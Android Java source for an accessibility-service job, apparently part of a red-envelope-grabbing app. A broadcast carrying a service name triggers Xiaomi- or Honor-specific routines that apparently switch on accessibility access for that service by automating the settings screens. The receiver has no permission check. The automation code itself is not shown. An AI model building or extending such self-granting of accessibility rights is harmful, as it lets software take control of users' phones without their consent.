/**
 * 
 */
package permission.accessibility;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import permission.accessibility.rom.GiveAccessibilityPermission_Honor;
import permission.accessibility.rom.GiveAccessibilityPermission_Xiaomi;
import util.ConfigCt;

/**
 * @author ASUS
 *
 */
public class GiveAccessibilityPermission extends BaseAccessibilityJob {
	private static GiveAccessibilityPermission current;
	private GiveAccessibilityPermission_Xiaomi mGiveAccessibilityPermission_Xiaomi;
	private GiveAccessibilityPermission_Honor mGiveAccessibilityPermission_Honor;
	    
	    private GiveAccessibilityPermission() {
	    	super(null);
	        mGiveAccessibilityPermission_Xiaomi=GiveAccessibilityPermission_Xiaomi.getGiveAccessibilityPermission_Xiaomi();
	        mGiveAccessibilityPermission_Honor=GiveAccessibilityPermission_Honor.getGiveAccessibilityPermission_Honor();

	    }
	    public static synchronized GiveAccessibilityPermission getGiveAccessibilityPermission() {
	        if(current == null) {
	            current = new GiveAccessibilityPermission();
	        }
	        return current;
	    }
		@Override
		public void onCreateJob(QiangHongBaoService service) {
			super.onCreateJob(service);
			mGiveAccessibilityPermission_Xiaomi.onCreateJob(service);
			mGiveAccessibilityPermission_Honor.onCreateJob(service);
	        //接收请求授权广播消息
			IntentFilter filter = new IntentFilter();
			filter.addAction(ConfigCt.ACTION_ACCESSBILITY_SERVICE_REQUEST);
			context.registerReceiver(requestPermissionReceiver, filter);
		}
	    @Override
	    public void onStopJob() {
	    	super.onStopJob();
	    	mGiveAccessibilityPermission_Xiaomi.onStopJob();
	    	mGiveAccessibilityPermission_Honor.onStopJob();
	        try {
	            getContext().unregisterReceiver(requestPermissionReceiver);
	        } catch (Exception e) {}
	    }
	    @Override
	    public void onReceiveJob(AccessibilityEvent event) {
	    	super.onReceiveJob(event);
	    	mGiveAccessibilityPermission_Xiaomi.onReceiveJob(event);
	    	mGiveAccessibilityPermission_Honor.onReceiveJob(event);
	    }
		/*
		 * (刷新处理流程)
		 * @see accessbility.AccessbilityJob#onWorking()
		 */
		@Override
		public void onWorking(){
	    	
		}
	    //--------------------------------------------------------------------------------------------------------------
	    /*
	     * 开始工作
	     */
		public void Start(String appName,String description){

			  if(ConfigCt.PhoneBrand.equals(ConfigCt.PHONE_BRAND_XIAOMI)){
				  mGiveAccessibilityPermission_Xiaomi.Start(appName,description);
				  return;
			  }
			  if(ConfigCt.PhoneBrand.equals(ConfigCt.PHONE_BRAND_HONOR)){
				  mGiveAccessibilityPermission_Honor.Start(appName,description);
				  return;
			  }
			  mGiveAccessibilityPermission_Honor.Start(appName,description);
		}
		private BroadcastReceiver requestPermissionReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				String action = intent.getAction();
				Log.d(ConfigCt.TAG, "receive-->" + action);
				if(ConfigCt.ACTION_ACCESSBILITY_SERVICE_REQUEST.equals(action)) {
					String servicename=intent.getStringExtra("servicename");
					String description=intent.getStringExtra("description");
					if(servicename==null||description==null)return;
					Log.d(ConfigCt.TAG, "servicename=" + servicename+";description=" + description);
					Start(servicename,description);
				}
			}
		};
}
